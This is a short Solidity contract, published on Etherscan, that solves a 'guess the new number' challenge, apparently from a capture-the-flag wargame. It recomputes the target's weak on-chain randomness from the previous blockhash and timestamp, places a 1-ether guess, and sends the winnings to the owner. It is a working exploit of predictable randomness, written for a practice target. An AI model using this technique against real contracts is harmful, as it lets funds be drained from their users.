/**
 *Submitted for verification at Etherscan.io on 2022-01-23
*/

// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {

    IGuessTheNewNumberChallenge public challenge;
    address public owner;

    constructor(address _challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        require(msg.value == 1 ether, "You must send an ether, first");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}

}